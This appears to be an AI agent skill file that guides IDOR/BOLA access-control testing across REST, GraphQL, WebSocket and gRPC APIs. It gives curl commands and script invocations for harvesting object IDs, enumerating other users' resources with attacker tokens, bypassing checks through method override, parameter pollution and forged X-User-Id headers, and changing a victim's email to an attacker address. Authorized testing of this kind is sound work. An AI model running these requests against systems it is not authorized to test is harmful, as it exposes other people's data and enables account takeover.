---
name: vuln-idor
description: "IDOR/BOLA (Insecure Direct Object Reference / Broken Object Level Authorization) testing skill. Tests horizontal/vertical access control across REST, GraphQL, WebSocket, and gRPC. Triggers: 'idor', 'bola', 'object level authorization', 'broken access control', 'unauthorized access', 'cross-account data', 'access control bypass'."
---

# IDOR / BOLA Testing

Insecure Direct Object Reference — object-level authorization failure. Test every object ID as untrusted.

## Phase 1: Attack Surface Discovery

Identifier locations to test: path params, query params, JSON body fields, headers, cookies, JWT claims, GraphQL arguments, WebSocket/gRPC messages.

ID formats: integers, UUIDs, ULIDs, slugs, composite keys, opaque tokens, base64-encoded values.

High-value targets: exports/backups, billing records, messaging, audit logs, admin tools, file storage keys, background job IDs, multi-tenant resources.

```bash
# Harvest IDs from list/search/export endpoints
curl -s "https://<target>/api/users?page=1" -H "Authorization: Bearer <token>" | jq '.data[].id'
curl -s "https://<target>/api/search?q=test" -H "Authorization: Bearer <token>" | jq '.results[].id'

# Extract IDs from notifications/inbox
curl -s "https://<target>/api/notifications" -H "Authorization: Bearer <token>" | jq '.[].resource_id'
```

## Phase 2: Automated Testing

**Sequential ID enumeration (victim vs attacker tokens):**
```bash
python3 idor_enum.py --url https://api.target.com/users/ID/profile \
  --token-a "Bearer <victim_token>" --token-b "Bearer <attacker_token>" --range 1 200
```

**UUID harvester:**
```bash
python3 uuid_harvest.py --token "Bearer <token>" --endpoints endpoints.txt --out id_corpus.json
```

**Blind IDOR confirmation (timing/ETag/size differentials):**
```bash
python3 blind_idor.py --url "https://api.target.com/messages/ID" \
  --token-a "Bearer <victim>" --token-b "Bearer <attacker>" --ids 1001,1002,1003
```

**GraphQL alias batching (retrieve multiple users in one call):**
```bash
python3 graphql_idor.py --url https://api.target.com/graphql \
  --token-attacker "Bearer <attacker_token>" --victim-ids "id1,id2,id3"
```

**Multi-tenant boundary testing:**
```bash
python3 tenant_idor.py --base-url https://api.target.com \
  --token-org-a "Bearer <victim_org_token>" --token-org-b "Bearer <attacker_org_token>" \
  --org-a-id "org_111" --org-b-id "org_222"
```

## Phase 3: Bypass Techniques

```bash
# Content-type switching
curl -X GET "https://<target>/api/resource/123" \
  -H "Authorization: Bearer <attacker>" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Method tunneling
curl -X POST "https://<target>/api/resource/123" \
  -H "X-HTTP-Method-Override: GET" \
  -H "Authorization: Bearer <attacker>"

# Parameter pollution (duplicate params)
curl "https://<target>/api/resource?id=123&id=456" -H "Authorization: Bearer <attacker>"
```

Additional bypasses:
- Cache confusion: manipulate `Vary`, `Accept`, auth headers; test CDN key misalignment
- Race conditions: change referenced IDs between validation and execution via parallel requests
- Blind detection: differential status codes, response sizes, ETags, timing

## Phase 4: Vertical Access Testing

```bash
# Lower-privilege token accessing admin-only resource
curl "https://<target>/api/admin/users" -H "Authorization: Bearer <user_token>"
curl "https://<target>/api/admin/reports/export" -H "Authorization: Bearer <user_token>"

# State change proof: PATCH/DELETE victim resource with attacker token
curl -X PATCH "https://<target>/api/users/<victim_id>/email" \
  -H "Authorization: Bearer <attacker_token>" \
  -d '{"email":"attacker@evil.com"}'
# Then verify change persists
curl "https://<target>/api/users/<victim_id>" -H "Authorization: Bearer <victim_token>"
```

## Phase 5: Microservice & Gateway Edge Cases

- **Token confusion:** Service A token accepted by Service B (missing audience/claims validation)
- **Header trust:** Reverse proxies inject `X-User-Id`; attempt override or removal
- **Context loss:** Async workers re-process requests without re-authorization
- **gRPC direct fields:** Protobuf fields often bypass HTTP middleware

```bash
# Override injected headers
curl "https://<target>/internal/resource" \
  -H "X-User-Id: admin" \
  -H "Authorization: Bearer <user_token>"
```

## Validation (REQUIRED before reporting)

Confidence threshold ≥0.70 required. Must demonstrate:
1. Access non-owned object via unauthorized principal (content or metadata exposed)
2. Same request fails with correct authorization removed
3. Access demonstrated across ≥2 transports (REST + GraphQL, etc.) where applicable
4. Document tenant boundary violations if applicable
5. Reproducible PoC: `owner GET → HTTP 200 + content; attacker GET same endpoint → HTTP 200 + same content; unauthorized GET → HTTP 401/403`

CVSS typically 7.5–9.1. Impact: PII/PHI/PCI exposure, unauthorized state changes, cross-tenant violations, GDPR/HIPAA risk.
